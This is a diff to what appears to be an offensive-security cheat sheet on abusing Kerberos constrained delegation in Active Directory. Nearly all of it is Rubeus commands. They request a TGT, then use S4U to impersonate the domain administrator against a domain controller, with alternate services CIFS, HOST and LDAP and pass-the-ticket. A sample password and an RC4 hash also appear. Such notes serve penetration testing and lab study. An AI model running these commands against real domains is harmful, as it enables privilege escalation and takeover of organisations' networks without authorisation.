@@ -291,14 +291,16 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 # if you are using the Delegation service (in a shell of context of the service) 
 ## request a delegation TGT for the user
 .\Rubeus.exe tgtdeleg
+.\Rubeus.exe asktgt /user:<username> /password:<password> /domain:<>domain /outfile:ticket.kirbi
 
 ## Using rubeus, we can now request TGS for administrator@offense.local, who will be allowed to authenticate to CIFS/dc01.offense.local
 Rubeus.exe s4u /ticket:<ticket hash> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
+Rubeus.exe s4u /ticket:<ticket file> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /altservice:CIFS,HOST,LDAP /dc:dc01.offense.local /ptt
 
 
 # if you are using diffrent shell context but you have the passowrd
 .\Rubeus.exe hash /password:Slavi123
-.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
+.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /altservice:CIFS,HOST,LDAP /dc:dc01.offense.local /ptt
 ```
 ### Delegation System/Machine
 ```shell
